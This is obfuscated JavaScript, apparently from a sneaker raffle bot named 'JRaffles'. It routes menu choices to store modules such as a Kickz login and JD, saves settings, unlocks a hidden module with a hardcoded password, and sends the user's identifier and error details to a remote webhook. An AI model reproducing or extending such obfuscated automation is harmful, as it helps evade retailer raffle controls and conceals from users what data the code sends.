                                                    var _0x5dd6af = await _0x36faf5(), _0x3d9bcf = await _0x245127();
                                                    return await _0x3067ed('https://www.kickz.com/nl/login/', _0x3c06a7, _0x3d9bcf, _0x5dd6af), _0x5816ec();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x5dd6af = await _0x36faf5(), _0x3d9bcf = await _0x245127();
                                                        return await _0x1b88bb(_0x3c06a7, _0x3d9bcf, _0x5dd6af), _0x5816ec();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x1159f2[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x5535ca(_0x1159f2[taskModule]['modules']);
                                                    var _0x3c06a7 = _0x1159f2[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x5dd6af = await _0x36faf5(), _0x3351e5 = await _0x245127();
                                                        return await _0x1a08d7(_0x3c06a7, _0x3351e5, _0x5dd6af), _0x5816ec();
                                                    }
                                                } else {
                                                    if (_0x1159f2[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x238216(0x3e8), _0x5816ec();
                                                    else {
                                                        if (_0x1159f2[taskModule]['name'] == 'Change\x20Settings') {
                                                            console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                            var _0x4aacc5 = 0x0;
                                                            for (const _0x446548 in _0x5eb805) {
                                                                console['log']('(' + _0x4aacc5 + ')\x20' + _0x446548 + '\x20:\x20' + _0x5eb805[_0x446548]), _0x4aacc5++;
                                                            }
                                                            console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x4aacc5 + ')\x20Return\x20to\x20Main\x20Menu');
                                                            var _0x34702d = await _0xa5e79f();
                                                            if (_0x34702d == _0x4aacc5)
                                                                return _0x5816ec();
                                                            console['clear'];
                                                            var _0xa1ae0e = 0x0;
                                                            for (var _0xd25cfa in _0x5eb805) {
                                                                if (_0x34702d == _0xa1ae0e) {
                                                                    console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0xd25cfa + '\x20:'), _0x5eb805[_0xd25cfa] = await _0x4a8d14(), _0x582c0f['writeFileSync']('../settings.json', JSON['stringify'](_0x5eb805));
                                                                    break;
                                                                } else
                                                                    _0xa1ae0e++;
                                                            }
                                                            return console['log']('Settings\x20Saved!'), await _0x238216(0xbb8), _0x5816ec();
                                                        } else {
                                                            if (_0x1159f2[taskModule]['name'] == 'Reload\x20Settings')
                                                                return console['log']('Reloading\x20settings'), await _0x44089a(), _0x5816ec();
                                                            else {
                                                                if (taskModule == 0x45) {
                                                                    _0x1159f2[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                    var _0x382a2d = await _0x17b04c();
                                                                    _0x382a2d == 'ModuleVoorDeBoys' ? (await _0x327cf6(), await _0x3274e4(), await afewFunction(_0x2b00a6[_0x422fa4], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x238216(0xbb8));
                                                                } else {
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            await _0x5816ec();
        } catch (_0x52a1fc) {
            return console['log'](_0x52a1fc), await _0x238216(0x3a98);
        }
}
;
_0x52fa74('JRaffles\x20' + _0x3cb81f), _0x44089a();
try {
    _0x5cc269();
} catch (_0x338270) {
    var _0x36aea7 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x44a8dd
            },
            {
                'name': 'Version',
                'value': '' + _0x3cb81f
            },
            {
                'name': 'Error',
                'value': '' + _0x338270
            }
        ]
    }];
    const _0x326def = { 'embeds': _0x36aea7 };
    _0x4f7227(_0x11ec69, _0x326def);
}